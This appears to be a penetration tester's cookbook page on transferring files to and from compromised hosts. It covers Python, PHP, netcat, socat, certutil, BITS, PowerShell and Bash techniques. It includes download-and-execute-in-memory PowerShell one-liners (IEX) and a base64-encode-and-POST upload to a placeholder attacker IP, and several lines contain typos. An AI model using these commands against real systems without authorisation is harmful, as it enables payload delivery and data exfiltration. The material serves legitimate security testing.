---
layout: default
title: Moving Files Around
parent: COOKBOOKS
has_children: false
has_toc: false
---

{% include toc.html %}

<br />

## Local web server
```
// Python 2
python -m SimpleHTTPServer

// Python3
python3 -m http.server
python3 -m http.server <port>
python3 -m http.server --bind 172.x.x.x 443
python3 -m http.server --bind 172.x.x.x --directory tools/ 443

// Ruby
ruby -run -ehttpd . -p8000

// PHP
php -S 0.0.0.0:8000

// Socat
socat TCP-LISTEN:8000,reuseaddr,fork
```

See [this link](https://floatingoctothorpe.uk/2017/receiving-files-over-http-with-python.html) for creating a `http.server` that accepts `PUT` requests. Use with something like:

```
curl -X PUT -T file-to-upload http://<IP>:<port>/
```

## Local FTP server
```
// Python 3
python3 -m pyftpdlib
python3 -m pyftpdlib --interface=172.x.x.x -p4433
python3 -m pyftpdlib --interface=172.x.x.x -p4433 -username=user --password='pass' --directory=tools/ --verbSMB server
```

## Downloading files with Urllib
```
// Python 2
import urllib
urllib.retrieve("http://10.x.x.x/script.sh", "script.sh")

// Python 3
import urllib.request
urllib.request.urlretieve("http://10.x.x.x/script.sh", "script.sh")
```

<br />

## Local SMB server
```
Main issue is trying to bind Windows to a non-standard port number. Running on the standard port requires sudo which is a pain.
// Sudo required for access to lower port.
sudo impacket-smbserver -username user -password pass -smb2support Shared tools/

// Sudo not required for higher port, this proves troublesome for Windows though.
impacket-smbserver -username user -password pass -port 4343 -smb2support Shared tools/
```

<br />

## PHP
```
// file_get_contents
php -r '$f = file_get_contents("http://10.x.x.x/script.sh"); file_put_contents("script.sh",$f);'

// fopen
php -r 'const BUFFER = 1024; $fremote = 
fopen("http://10.x.x.x/script.sh", "rb"); $flocal = fopen("script.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

// curl
php -r '$rfile = "https://10.x.x.x/script.sh"; $lfile = "script.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'

```

<br />

## Netcat
Note there are multiple implementations of Netcat: netcat, ncat and nc to name a few.

```
// On sender.
nc -q0 10.x.x.x 4343 < file.in
compress -c file.in | nc -q0 10.x.x.x 4343

// On receiver.
nc -lp 4343 > file.out
nc -lp 4343 | uncompress > file.out
```

<br />

## Socat
```
// On sender.
socat -u FILE:file.in TCP:10.x.x.x:4343

// On receiver.
socat -u TCP-LISTEN:4343 OPEN:file.out,creat,trunc
```

<br />

## Secure Copy
Assumes ssh access.

```
// Copy file from target to local folder.
scp user@10.x.x.x:file.in /local/folder/

// Copy directory from target to local folder.
scp -r user@10.x.x.x:/remote/folder /local/folder/

// Copy local file to remote target.
scp file.local user@10.x.x.x;/remote/folder/

// Copy local folder to remote target.
scp -r /local/folder/ user@10.x.x.x /local/folder/

// Copy remote file to remote target.
scp from-user@10.x.x.x:/source/folder/ to-user@10.y.y.y:/dest/folder/ 
```

<br />

## Windows certutil.exe
```
certutil -urlcache -f http://10.x.x.x/file.exe out.exe
certutil -verifyctl -split -f http://10.x.x.x/file.exe
```

<br />

## Windows BITS
```
// Download resource from web server or SMB share.
bitsadmin /transfer n http://10.x.x.x:443/file.exe C:\Users\Public\Downloads\file.exe
```

<br />

## PowerShell
### DownloadString
```
// Download and execute in memory using Invoke-Expression (IEX).
IEX(New-Object Net.WebClient).DownloadString('http://10.x.x.x:80/resource.ps1')

// Download and execute in memory using IEX.
(New-Object Net.WebClient).DownloadString('http://10.x.x.x:80/resource.ps1') | IEX
```

### DownloadFile
```
// Download and save file locally.
(New-Object Net.WebClient).DownloadFile('http://10.x.x.x:80/resource.ps1', "C:\Users\Public\Downloads\resource.ps1")
```

### Invoke-WebRequest
```
// Download.
Invoke-WebRequest http://10.x.x.x:80/resource.ps1 -OutFile resource.ps1

// Download and execute in memory.
Invoke-WebRequest http://10.x.x.x:00/resource.ps1 | IEX

// Download, ignore IE not having been run errors
Invoke-WebRequest http://10.x.x.x:80/resource.ps1 -UseBasicParsing | IEX

// Upload to POST enabled HTTP server.
$data = [System.Convert]::ToBase64String((Get-Content -Path 'C:\Users\Public\Downloads\dir.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://10.x.x.x:80 -Method POST -Body $data
```

### Start-BitsTransfer
```
// Import the module.
Import-Modile bitstransfer

// Download.
Start-BitsTransfer -Source "http://10.x.x.x/file.exe" -Destination "C:\Users\Public\Downloads\file.exe"

// Upload (check the available options for this).
Start-BitsTransfer "C:\Users\Public\Downloads\file.exe" -Destination "http://10.x.x.x/file.exe" -TransferType Upload
```

### Windows Misc
```
// Test for the following aliases:
curl
wget 
```

<br />

## Evil-WinRM
```
// Upload local file to remote.
*Evil-WinRM* PS C:\> Upload local.file remote.file

// Download remote file to local.
*Evil-WinRM* PS C:\> Download remote.file local.file
```

## Linux cURL and wget
```
// Download and save file.
curl http://10.x.x.x/resource.sh -o resource.sh

// Download and save file.
wget http://10.x.x.x/resource.sh -O resource.sh
```

<br />

## OpenSSL
```
// First generate a certificate.
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 1 -out cert.pem

// Start server.
openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < /file/to/serve.sh

// Download.
openssl s_client -connect 10.x.x.x:80 -quiet > served.sh
```

<br />

## Bash
```
// Connect to webserver listening on port 80.
exec 3<>/dev/tcp/10.x.x.x/80

// Make get request.
echo -e "GET /resource.sh HTTP/1.1\n\n">&3

// Response.
cat <&3
```

<br />

## Encoding
### OpenSSL
```
// Encode.
openssl enc -base64 -in file.exe -out file.txt

// Decode.
openssl enc -base64 -d -in file.txt -out file.exe
```

<br />

## Misc
If you have a shell and the files are small, you can convert them to `base64` and copy/paste between windows.

